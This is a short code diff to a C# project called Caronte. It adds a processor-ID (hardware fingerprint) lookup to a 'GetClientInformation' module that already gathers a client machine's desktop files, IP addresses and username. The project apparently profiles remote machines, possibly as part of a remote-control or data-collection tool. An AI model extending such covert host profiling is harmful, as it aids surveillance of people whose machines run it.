@@ -12,6 +12,7 @@ using System.Net.Http;
 using System.Net.Sockets;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Management;
 
 namespace Caronte.Modules.Information.GetClientInformation
 {
@@ -37,7 +38,8 @@ namespace Caronte.Modules.Information.GetClientInformation
                 DesktopFiles = await GetClientDesktopFiles(),
                 ExternalIp = await GetExternalIp(),
                 LocalIp = await GetLocalIp(),
-                Username = await GetUsername()
+                Username = await GetUsername(),
+                ProcessorIdentifier = GetProcessorIdentifer()
             });
         }
 
@@ -124,6 +126,19 @@ namespace Caronte.Modules.Information.GetClientInformation
             }
 
             return new byte[0];
+        }
+
+        private string GetProcessorIdentifer()
+        {
+            var managementSearcher = new ManagementObjectSearcher("Select ProcessorId From Win32_processor");
+            var managementObjects = managementSearcher.Get();
+
+            var hwid = "";
+
+            foreach (ManagementObject managementObject in managementObjects)
+                hwid = managementObject["ProcessorId"].ToString();
+
+            return hwid;
         }
     }
 }
